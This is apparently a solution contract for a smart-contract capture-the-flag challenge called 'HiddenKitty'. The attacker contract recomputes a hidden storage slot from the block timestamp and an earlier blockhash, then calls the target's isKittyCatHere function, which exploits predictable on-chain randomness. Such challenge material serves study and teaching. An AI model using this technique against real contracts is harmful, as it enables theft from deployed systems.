// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../ChallengeHiddenKitty.sol";

contract HiddenKittyCatAttacker {
    constructor(address target) {
        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));
        House house = House(target);
        house.isKittyCatHere(slot);
    }
}
